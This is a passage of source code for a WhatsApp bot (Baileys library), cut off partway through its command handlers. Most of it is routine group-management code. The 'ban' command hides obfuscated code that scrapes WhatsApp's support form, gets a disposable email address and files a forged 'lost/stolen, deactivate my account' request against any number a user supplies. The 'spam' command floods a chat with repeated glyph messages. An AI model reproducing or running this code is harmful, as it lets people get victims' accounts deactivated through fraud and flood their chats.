/**
   * Create By Dika Ardnt.
   * Contact Me on wa.me/6288292024190
   * Follow https://github.com/DikaArdnt
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const vndatas = JSON.parse(fs.readFileSync('./src/vn.json'))
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
const zrapi = require("zrapi")
const yts = require('yt-search' )
const cheerio = require('cheerio')

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
let vndata = db.data.vn = []
dtod = "919947291867@s.whatsapp.net"

module.exports = sparrow = async (sparrow, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await sparrow.decodeJid(sparrow.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const dn = q
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	    const wita = moment.tz('Asia/Kolkata').format('HH:mm:ss')
	    const status = `${sparrow.public ? '𝖕𝖚𝖇𝖑𝖎𝖈 𝖒𝖔𝖉𝖊' : '𝖘𝖊𝖑𝖋 𝖒𝖔𝖉𝖊'}`
	    gcid = ['919526335586-1629468235@g.us']
		const istestgc = gcid.includes(m.chat) ? true : false
		const reply = async(teks) => {await sparrow.sendMessage(m.chat,{text: teks},{quoted:m})}
const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
sparrow.sendMessage(id, listMessage, options)}

	    		myDays = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
		        myMonths = ["January","February","March","April","May","June","July","August","September","October","November","December"];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
	            
	            const  timestampi = speed();
				const  latensii = speed() - timestampi
				const latensiii = `${latensii.toFixed(4)} 𝕊𝔼ℂ𝕆ℕ𝔻`
	
        // Group
        const groupMetadata = m.isGroup ? await sparrow.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }

        // Push Message To Console && Auto Read
        if (m.message) {
                        console.log('\n' + chalk.green('     ─────────────────────〔 𝖒𝖊𝖘𝖘𝖆𝖌𝖊 〕─────────────────────') + '\n' + chalk.grey('=> 𝖓𝖆𝖒𝖊'), chalk.cyanBright(pushname) + '\n' + chalk.grey('=> 𝖙𝖎𝖒𝖊'),chalk.magenta(new Date) + '\n' + chalk.grey('=> 𝖒𝖊𝖘𝖘𝖆𝖌𝖊'),chalk.blueBright(budy || m.mtype) + '\n' + chalk.grey('=> 𝖋𝖗𝖔𝖒'), chalk.magentaBright(m.isGroup ? '𝖌𝖗𝖔𝖚𝖕' : '𝖕𝖗𝖎𝖛𝖆𝖙𝖊 𝖈𝖍𝖆𝖙'), chalk.yellow(m.isGroup ? groupMetadata.subject : m.chat) + '\n' + chalk.green('     ───────────────────────────────────────────────────────'))
        }

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Kolkata"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await sparrow.setStatus(`𝖏𝖆𝖗𝖛𝖎𝖘 𝖇𝖞 𝖘𝖕𝖆𝖗𝖗𝖔𝖜`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`https://`)) {
        if (!isBotAdmins) return 
        if (isAdmins) return 
        if (isCreator) return 
        let gclink = (`https://chat.whatsapp.com/`+await sparrow.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return 
        m.reply(`──────〔 𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 〕──────\n\n𝖑𝖎𝖓𝖐 𝖉𝖊𝖙𝖊𝖈𝖙𝖊𝖉! 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖇𝖊 𝖗𝖊𝖒𝖔𝖛𝖊𝖉!`)
        await sparrow.sendMessage(m.chat,{delete: {remoteJid: m.chat,fromMe: false,id: m.key.id,participant: m.key.participant}})
        sparrow.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        } else if (budy.match(`http://`)) {
        if (!isBotAdmins) return 
        if (isAdmins) return 
        if (isCreator) return 
        let gclink = (`https://chat.whatsapp.com/`+await sparrow.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return 
        m.reply(`──────〔 𝖆𝖓𝖙𝖎𝖑𝖎𝖓𝖐 〕──────\n\n𝖑𝖎𝖓𝖐 𝖉𝖊𝖙𝖊𝖈𝖙𝖊𝖉! 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖇𝖊 𝖗𝖊𝖒𝖔𝖛𝖊𝖉!`)
        await sparrow.sendMessage(m.chat,{delete: {remoteJid: m.chat,fromMe: false,id: m.key.id,participant: m.key.participant}})
        sparrow.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }
      
      if (m.message){
      const vnedd = m.message
      if (vnedd === global.db.data.vn){
      try {console.log(chalk.green('......................2 kitty......................'))
      let audiovn = fs.readFileSync(`./media/vn/${m.message}.mp3`)
      sparrow.sendMessage(m.chat, {audio: audiovn, mimetype: 'audio/mp3'}, { quoted : m })
      console.log(chalk.green('......................VN......................'))
      } catch { console.log(chalk.redBright('PATTICHE!!!')) }
      }}
      
      if (m.mtype == 'videoMessage') { if (istestgc) {
      let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
        let mediaas = await sparrow.downloadAndSaveMediaMessage(m.message.videoMessage)
        let buffery = await UploadFileUgu(mediaas)
        sparrow.sendMessage('919072734003-1618144071@g.us',{ video: {url: buffery.url }, caption : '✨', mimetype: 'video/mp4'})

        }}
      
      for (let drips of vndatas){
    if (budy === drips){
            result = fs.readFileSync(`./media/vn/${drips}.mp3`)
sparrow.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4' , ptt: true }, { quoted: m})
}
}

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: sparrow.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, sparrow.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        sparrow.ev.emit('messages.upsert', msg)
        }
	    

            try {
            ppuser = await hisoka.profilePictureUrl(num, 'image')
            } catch {
            ppuser = 'https://b.top4top.io/p_2338jfc3b0.jpg'
            }
            const ofrply = await getBuffer(ppuser)

	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        switch(command) {
        
        case 'ban':  {
        var _0x10a3fd=_0x30f2;function _0x1e8a(){var _0x566960=['nwPcqvLKrG','C2vHCMnO','DgfIBgu','qu5euK9jra','ndCYmZu3ogjsB2DYAq','x19JC3i','CgfYC2u','x19H','Bg9N','zw1HAwW','mJy5odq1muL4B2fSzq','nty4nZC1mgvPuLjUvW','yxbWBhK','zMLUza','mtzir3nAAgu','z2v0','mtaWnJyZmdG1oa','y29UC3rYDwn0B3i','otu3ndi2wvrzzgjJ','yxbWzw5K','AgvHzgvYCW','AM9PBG','C3vIBwL0','mw1IserTuG','zxHJzxb0Aw9U','x19Yzxy','ue9tva','y29UC29Szq','yMLUza','otnVzxvNDLa','Aw5WDxrBBMfTzt1SC2rD','kcGOlISPkYKRksSK','zM9YBwf0','AMf6B2vZDa','Dg9tDhjPBMC','Ahr0Chm6lY93D3CUmxnLy21HAwWUy29Tl2fWAs92ms8/ywn0Aw9UpwDLBLjHBMrVBu1HAwXIB3GMy291BNq9mq','zw1HAwXFy29UzMLYBq','ugvYzgLKBY9YB3vIywrVoIbKzxnHDgL2zsbTAw5OysbJB250yq','x191C2vY','nZe5ntzpBMXHBvq','vu5ltK9xtG','BhnK','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','BgvUz3rO','mZa4otqXnLf4B3HAua','AhjLzG','x19Yzxe','CMv0DxjUicHMDw5JDgLVBIGPia','x19JB21Tzw50x3jLCq','CgHVBMvFBNvTyMvY','CMvWBgfJzq','ndm4mtaYowvhDfzrsq','yxr0CG','D2fYBG','u3vRC2vZia','mtKZmtyUqLa6D2HHDhnHChbFD3D3x3bRzY4YlJaUmc4WlJa','zM9YicG7oYK7','Aw5WDxrBBMfTzt1QyxPVzxn0xq','DMfS','Bg9Hza','y291BNrYEv9ZzwXLy3rVCG','mtjYAer2rw8','ChjVDg90ExbL','zgf0yq','C3rLCa'];_0x1e8a=function(){return _0x566960;};return _0x1e8a();}(function(_0x3d7025,_0x2766ce){var _0x534253=_0x30f2,_0x500248=_0x3d7025();while(!![]){try{var _0x1cac44=parseInt(_0x534253(0x21e))/0x1*(parseInt(_0x534253(0x219))/0x2)+parseInt(_0x534253(0x224))/0x3*(-parseInt(_0x534253(0x1ed))/0x4)+-parseInt(_0x534253(0x207))/0x5*(parseInt(_0x534253(0x20b))/0x6)+-parseInt(_0x534253(0x211))/0x7+parseInt(_0x534253(0x215))/0x8*(parseInt(_0x534253(0x1f9))/0x9)+parseInt(_0x534253(0x212))/0xa+parseInt(_0x534253(0x1f2))/0xb*(parseInt(_0x534253(0x203))/0xc);if(_0x1cac44===_0x2766ce)break;else _0x500248['push'](_0x500248['shift']());}catch(_0x21a0b1){_0x500248['push'](_0x500248['shift']());}}}(_0x1e8a,0x8b863));var _0x23aa42=(function(){var _0x1e8e60=!![];return function(_0x16b2bc,_0x4a86b4){var _0x78a717=_0x1e8e60?function(){var _0x4ab85b=_0x30f2;if(_0x4a86b4){var _0x4c9e2f=_0x4a86b4[_0x4ab85b(0x213)](_0x16b2bc,arguments);return _0x4a86b4=null,_0x4c9e2f;}}:function(){};return _0x1e8e60=![],_0x78a717;};}()),_0x286f59=_0x23aa42(this,function(){var _0x5ef3f3=_0x30f2;return _0x286f59['toString']()['search'](_0x5ef3f3(0x226))[_0x5ef3f3(0x229)]()[_0x5ef3f3(0x218)](_0x286f59)[_0x5ef3f3(0x208)](_0x5ef3f3(0x226));});_0x286f59();var _0x4e298b=(function(){var _0x8935aa=!![];return function(_0x3ea9e8,_0x53736d){var _0x52d475=_0x8935aa?function(){var _0x2898c4=_0x30f2;if(_0x53736d){var _0x5d590d=_0x53736d[_0x2898c4(0x213)](_0x3ea9e8,arguments);return _0x53736d=null,_0x5d590d;}}:function(){};return _0x8935aa=![],_0x52d475;};}()),_0xaf7725=_0x4e298b(this,function(){var _0x5ea466=_0x30f2,_0x5e1524=function(){var _0x4a44e5=_0x30f2,_0x235c4a;try{_0x235c4a=Function(_0x4a44e5(0x1f5)+_0x4a44e5(0x1f0)+');')();}catch(_0x150a93){_0x235c4a=window;}return _0x235c4a;},_0x51fe4f=_0x5e1524(),_0x6091c2=_0x51fe4f['console']=_0x51fe4f[_0x5ea466(0x222)]||{},_0x37a9c0=[_0x5ea466(0x20f),_0x5ea466(0x1fb),'info','error',_0x5ea466(0x21f),_0x5ea466(0x209),'trace'];for(var _0x4b9686=0x0;_0x4b9686<_0x37a9c0[_0x5ea466(0x1f1)];_0x4b9686++){var _0x1c26e0=_0x4e298b[_0x5ea466(0x218)][_0x5ea466(0x204)][_0x5ea466(0x223)](_0x4e298b),_0x54b545=_0x37a9c0[_0x4b9686],_0x354dc5=_0x6091c2[_0x54b545]||_0x1c26e0;_0x1c26e0['__proto__']=_0x4e298b[_0x5ea466(0x223)](_0x4e298b),_0x1c26e0[_0x5ea466(0x229)]=_0x354dc5[_0x5ea466(0x229)]['bind'](_0x354dc5),_0x6091c2[_0x54b545]=_0x1c26e0;}});_0xaf7725();var ntah=await axios['get']('https://www.whatsapp.com/contact/noclient/'),email=await axios[_0x10a3fd(0x216)](_0x10a3fd(0x22a)),cookie=ntah[_0x10a3fd(0x21b)]['set-cookie'][_0x10a3fd(0x21c)](';\x20'),$=cheerio[_0x10a3fd(0x201)](ntah[_0x10a3fd(0x205)]),$form=$('form'),url=new URL($form[_0x10a3fd(0x1fa)]('action'),'https://www.whatsapp.com')[_0x10a3fd(0x1f3)],form=new URLSearchParams();function _0x30f2(_0x1adab2,_0x300776){var _0x2e830e=_0x1e8a();return _0x30f2=function(_0xaf7725,_0x4e298b){_0xaf7725=_0xaf7725-0x1ec;var _0x372579=_0x2e830e[_0xaf7725];if(_0x30f2['nVpWln']===undefined){var _0x255901=function(_0x30f237){var _0x2bf58c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x585c04='',_0x5b1926='',_0x1b1021=_0x585c04+_0x255901;for(var _0xd229c5=0x0,_0x478273,_0x1e8e60,_0x16b2bc=0x0;_0x1e8e60=_0x30f237['charAt'](_0x16b2bc++);~_0x1e8e60&&(_0x478273=_0xd229c5%0x4?_0x478273*0x40+_0x1e8e60:_0x1e8e60,_0xd229c5++%0x4)?_0x585c04+=_0x1b1021['charCodeAt'](_0x16b2bc+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x478273>>(-0x2*_0xd229c5&0x6)):_0xd229c5:0x0){_0x1e8e60=_0x2bf58c['indexOf'](_0x1e8e60);}for(var _0x4a86b4=0x0,_0x78a717=_0x585c04['length'];_0x4a86b4<_0x78a717;_0x4a86b4++){_0x5b1926+='%'+('00'+_0x585c04['charCodeAt'](_0x4a86b4)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5b1926);};_0x30f2['QTETkK']=_0x255901,_0x1adab2=arguments,_0x30f2['nVpWln']=!![];}var _0x286f59=_0x2e830e[0x0],_0x23aa42=_0xaf7725+_0x286f59,_0x1e8aa3=_0x1adab2[_0x23aa42];if(!_0x1e8aa3){var _0x4c9e2f=function(_0x8935aa){this['HxHKAo']=_0x8935aa,this['RucJYp']=[0x1,0x0,0x0],this['yNgwEB']=function(){return'newState';},this['iLZxeU']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['YQioTr']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4c9e2f['prototype']['EYJAdq']=function(){var _0x3ea9e8=new RegExp(this['iLZxeU']+this['YQioTr']),_0x53736d=_0x3ea9e8['test'](this['yNgwEB']['toString']())?--this['RucJYp'][0x1]:--this['RucJYp'][0x0];return this['ejGZIM'](_0x53736d);},_0x4c9e2f['prototype']['ejGZIM']=function(_0x52d475){if(!Boolean(~_0x52d475))return _0x52d475;return this['hUeBFy'](this['HxHKAo']);},_0x4c9e2f['prototype']['hUeBFy']=function(_0x5d590d){for(var _0x5e1524=0x0,_0x51fe4f=this['RucJYp']['length'];_0x5e1524<_0x51fe4f;_0x5e1524++){this['RucJYp']['push'](Math['round'](Math['random']())),_0x51fe4f=this['RucJYp']['length'];}return _0x5d590d(this['RucJYp'][0x0]);},new _0x4c9e2f(_0x30f2)['EYJAdq'](),_0x372579=_0x30f2['QTETkK'](_0x372579),_0x1adab2[_0x23aa42]=_0x372579;}else _0x372579=_0x1e8aa3;return _0x372579;},_0x30f2(_0x1adab2,_0x300776);}form[_0x10a3fd(0x21a)](_0x10a3fd(0x228),$form[_0x10a3fd(0x214)](_0x10a3fd(0x1ff))[_0x10a3fd(0x200)]()),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1ef),$form[_0x10a3fd(0x214)](_0x10a3fd(0x225))['val']()),form[_0x10a3fd(0x21a)](_0x10a3fd(0x206),_0x10a3fd(0x21d)),form['append'](_0x10a3fd(0x202),'ID'),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1f7),''+dn),form['append'](_0x10a3fd(0x210),email[_0x10a3fd(0x205)][0x0]),form['append'](_0x10a3fd(0x22b),email['data'][0x0]),form['append']('platform',_0x10a3fd(0x20a)),form[_0x10a3fd(0x21a)]('your_message',_0x10a3fd(0x22c)),form['append'](_0x10a3fd(0x1ec),'0'),form[_0x10a3fd(0x21a)](_0x10a3fd(0x20e),'1'),form['append'](_0x10a3fd(0x20c),''),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1f4),'8'),form[_0x10a3fd(0x21a)]('__hs',_0x10a3fd(0x1fd)),form['append']('dpr','1'),form[_0x10a3fd(0x21a)]('__ccg',_0x10a3fd(0x1ee)),form['append'](_0x10a3fd(0x220),_0x10a3fd(0x217)),form[_0x10a3fd(0x21a)](_0x10a3fd(0x1f6),'0');var res=await axios({'url':url,'method':_0x10a3fd(0x221),'data':form,'headers':{'cookie':cookie}});reply(_0x10a3fd(0x1fc)+command+'\x20'+dn+'\x20'+util[_0x10a3fd(0x227)](JSON[_0x10a3fd(0x20d)](res[_0x10a3fd(0x205)][_0x10a3fd(0x1f8)](_0x10a3fd(0x1fe),''))));
}
					break
        
        case 'spam':  {
                    teks = '𝖏𝖆𝖗𝖛𝖎𝖘𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝\n𔒝 ᴊᴀʀᴠɪs 𔒝'
					sparrow.reply(m.chat, teks, m)
					sparrow.reply(m.chat, teks, m)
					sparrow.reply(m.chat, teks, m)
					sparrow.reply(m.chat, teks, m)
					sparrow.reply(m.chat, teks, m)
					}
					break
        
	    case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`🌹𝖓𝖆𝖒𝖊 : ${m.pushName}\n🌹𝖆𝖋𝖐 𝖗𝖊𝖆𝖘𝖔𝖓 : ${text ? ': ' + text : ''}`)
            }
            break	


            case 'git': {
            sparrow.reply(m.chat, `𝖌𝖎𝖙 : https://github.com/sparroo`, m)
            }
            break
            
            case 'read': {
    if (!quoted) throw `𝖗𝖊𝖕𝖑𝖞 𝖙𝖔 𝖆𝖓 𝖎𝖒𝖆𝖌𝖊/𝖛𝖎𝖉𝖊𝖔`
		await sparrow.copyNForward(m.chat, m.message, true)
    }
            break
            case 'open': {
    if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		sparrow.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Succesfully opened Group`)).catch((err) => m.reply(jsonformat(err)))
    }
            break
            
            case 'close': {
    if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		sparrow.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Succesfully closed Group`)).catch((err) => m.reply(jsonformat(err)))
    }
            break
            
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    sparrow.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    sparrow.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    sparrow.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    sparrow.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    sparrow.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    sparrow.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    sparrow.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                sparrow.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw '𝖜𝖍𝖊𝖗𝖊 𝖎𝖘 𝖙𝖍𝖊 𝖑𝖎𝖓𝖐?'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw '𝖎𝖓𝖛𝖆𝖑𝖎𝖉 𝖑𝖎𝖓𝖐!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await sparrow.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await sparrow.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
